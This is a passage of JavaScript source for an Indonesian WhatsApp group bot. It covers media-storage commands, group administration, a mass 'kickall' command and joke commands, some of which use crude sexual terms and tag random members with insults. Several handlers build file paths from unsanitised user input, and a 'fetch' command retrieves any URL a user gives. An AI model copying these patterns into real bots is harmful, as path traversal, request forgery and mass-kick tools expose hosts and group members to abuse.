				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				Ramdani.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: troli})
				break
				
case 'addvid': 
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
				if (!isOwner) return freply(mess.only.owner)
				if (!isQuotedVideo) return freply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return freply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Ramdani.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				Ramdani.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: troli })
				break
			        
case 'addvn': 
                if (!isRegist) return freply(mess.regist)
                if (isBanned) return freply(mess.banned)
				if (!isOwner) return freply(mess.only.owner)
				if (!isQuotedAudio) return freply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return freply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await Ramdani.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				Ramdani.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: troli})
				break 
case 'liststik': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
				break				
case 'listimg': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
				break				
case 'listvid': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": imagenye } })
				break				
case 'listvn': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": audionye } })
				break	
case 'getstik': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
				Ramdani.sendMessage(from, result, sticker,{quoted:troli})
				} catch {
				  freply('Pack tidak terdaftar')
				}
				break				
case 'getimg': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
				Ramdani.sendMessage(from, buffer, image, { quoted: troli, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  freply('Pack tidak terdaftar')
				}
				break
				
case 'getvid': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
				Ramdani.sendMessage(from, buffer, video, { quoted: troli, caption: `Result From Database : ${namastc}.mp4` })
				} catch {
				  freply('Pack tidak terdaftar')
				}
				break				
case 'getvn': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
				Ramdani.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: troli, ptt: true })
				} catch {
				  freply('Pack tidak terdaftar')
				}
				break
//------------------< G R U P >-------------------
case 'linkgc': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
				if (!isGroup) return freply(mess.only.group)
				linkgc = await Ramdani.groupInviteCode (from)
				yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				Ramdani.sendMessage(from, yeh, text, {quoted: mek})
				break
            case 'kick': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isGroupAdmins) return freply(mess.only.admin)
             if (!isGroup) return freply(mess.only.group)
             kick(from, mentionUser)
             break
      case 'add': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
             entah = arg.split("|")[0]
             entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
             entah = `${entah}@s.whatsapp.net`
             Ramdani.groupAdd(from, [entah])
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             Ramdani.groupAdd(from, [entah])
}
             break
      case 'promote': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             freply('🗿')
             if (!isGroupAdmins) return freply(mess.only.admin)
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             Ramdani.groupMakeAdmin(from, mems_ids)
             } else {
             Ramdani.groupMakeAdmin(from, entah)
}
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             Ramdani.groupMakeAdmin(from, [entah])
}
             break
      case 'demote': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             freply('🗿')
             if (!isGroupAdmins) return freply(mess.only.admin)
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             Ramdani.groupDemoteAdmin(from, mems_ids)
             } else {
             Ramdani.groupDemoteAdmin(from, [entah[0]])
}
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             Ramdani.groupDemoteAdmin(from, [entah])
}
             break
       case 'setgrupname': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (!isGroup) return freply(mess.only.group)
              if (!isBotGroupAdmins) return 
              if (args.length == 0) return freply(`Penggunaan ${prefix}setgrupname name`)
              Ramdani.groupUpdateSubject(from, q)
             .then((res) => freply(jsonformat(res)))
             .catch((err) => freply(jsonformat(err)))
              break
       case 'setdesc': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (!isGroup) return freply(mess.only.group)
              if (!isBotGroupAdmins) return freply(mess.only.Badmin)
              if (args.length == 0)  return freply(`Penggunaan ${prefix}setdesc desc`)
              Ramdani.groupUpdateDescription(from, q)
             .then((res) => freply(jsonformat(res)))
             .catch((err) => freply(jsonformat(err)))
              break
       case 'setppgrup': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (!isGroup) return freply(mess.only.group)
              if (!isBotGroupAdmins) return freply(mess.only.Badmin)
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
              let media = await Ramdani.downloadMediaMessage(encmedia)
              Ramdani.updateProfilePicture(from, media)
             .then((res) => freply(jsonformat(res)))
             .catch((err) => freply(jsonformat(err)))
              } else {
              freply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
              break
       case 'me':
       case 'profile': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              let Levelnye = level.getLevelingLevel(sender, _level)
              let Xpluu = level.getLevelingXp(sender, _level)
              let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
              Ramdani.updatePresence(from, Presence.composing)
              try {
              profil = await Ramdani.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
              } catch {
              profil = errorImg
}
              thu = await Ramdani.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = Ramdani.user
              uptime = process.uptime()
              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
              buff = await getBuffer(profil)
              Ramdani.sendMessage(from, buff, image, {quoted: freply, caption: profile})
              break
       case 'afk':  
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroup) return freply(mess.only.group)
              if (isAfkOn) return freply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(sender, time, reason, _afk)
              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
              freply(aluty)
              break
       case 'infogrup':
       case 'grupinfo':
       case 'groupinfo': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isGroup) return freply(mess.only.group)
              try {
              var pic = await Ramdani.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
              Ramdani.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
       case 'tagall': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (!isGroup) return freply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
       case 'kickall': // Anti Banned 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              for (let i of groupMembers) {
              await kickMember(from, [i.jid])
}
              break
       case 'leave': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (!isGroup) return freply(mess.only.group)
              setTimeout( () => {
              Ramdani.groupLeave(from) 
              }, 2000)
              setTimeout( () => {
              freply('Byee...')
              }, 0)
              break
       case 'online':
       case 'listonline':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isGroup) return freply(`Only group`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(Ramdani.chats.get(ido).presences), Ramdani.user.jid]
             Ramdani.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             freply(`${e}`)
}
             break
      case 'hidetag': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isGroupAdmins) return freply(mess.only.admin)
             try {
             quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             break
      case 'sider': 
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!isGroupAdmins) return freply(mess.only.admin)
             if(!isGroup) return freply(mess.only.group)
             try {
             infom = await Ramdani.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Dibaca oleh:*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Tersampaikan pada:*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             freply('Reply chat bot!')
}
             break
//------------------< Fun >-------------------
       case 'Ramdani ganteng':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              if (!q) return
              qq = q.toUpperCase()
              makasih = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              freply(makasih)
              break
       case 'mining':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              var mining = randomNomor(1000)
              atm.addKoinUser(sender, mining, _uang)
              await freply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
              break
       case 'waktu':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              freply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
              break
       case 'cekmati':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              if (!q) return freply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              freply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
       case 'toxic':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              Toxic().then(toxic => {
              freply(toxic)
})
              break
        case 'citacita':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              Ramdani.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
              break
       case 'apakah':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              apakah = body.slice(1)
              const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
              const kah = apa[Math.floor(Math.random() * apa.length)]
              Ramdani.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: mek })
              break
       case 'rate':
       case 'nilai':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              rate = body.slice(1)
              const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
              const te = ra[Math.floor(Math.random() * ra.length)]
              Ramdani.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: mek })
              break
       case 'gantengcek':
       case 'cekganteng':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              Ramdani.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
              break
       case 'cantikcek':
       case 'cekcantik':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              Ramdani.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
              break
       case 'cekwatak':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              var namao = pushname
              var prfx = await Ramdani.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colmek','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await freply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
       case 'hobby':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              hobby = body.slice(1)
              const by = hobby[Math.floor(Math.random() * hobby.length)]
              Ramdani.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
              break
       case 'bisakah':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              Ramdani.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
              break
       case 'kapankah':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              Ramdani.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              break
       case 'truth':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
              const ttrth = trut[Math.floor(Math.random() * trut.length)]
              truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Ramdani.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
              break
       case 'dare':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
              const der = dare[Math.floor(Math.random() * dare.length)]
              buffer = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Ramdani.sendMessage(from, buffer, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
              break		
       case 'jadian':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
       case 'cantik':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              membr = []
              const mes = groupMembers
              const msk = groupMembers
              const siaps = mes[Math.floor(Math.random() * mes.length)]
              const sips = pushname[Math.floor(Math.random() * msk.length)]
              teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
              membr.push(siaps.jid)
              mentions(teks, membr, true)
              break
       case 'ganteng':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              break
       case 'babi':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bi = pushname[Math.floor(Math.random() * mge.length)]
              teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
              membr = []
              const nge = groupMembers
              const tod = groupMembers
              const beb = nge[Math.floor(Math.random() * nge.length)]
              const an = pushname[Math.floor(Math.random() * tod.length)]
              teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break
//------------------< Lainnya >-------------------
      case 'get':
      case 'fetch':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (!/^https?:\/\//.test(q)) return freply('Awali *URL* dengan http:// atau https://')
             res = await fetch(q)
             if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
             delete res
             throw `Content-Length: ${res.headers.get('content-length')}`
}
             if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
             txtx = await res.buffer()
             try {
             txtx = util.format(JSON.parse(txtx+''))
             } catch (e) {
             txtx = txtx + ''
             } finally {
             freply(txtx.slice(0, 65536) + '')
}
             break
      case 'searchmsg': 
      case 'caripesan':
             if (!isRegist) return freply(mess.regist)
             if (isBanned) return freply(mess.banned)
             if (args.length < 1) return freply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return freply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
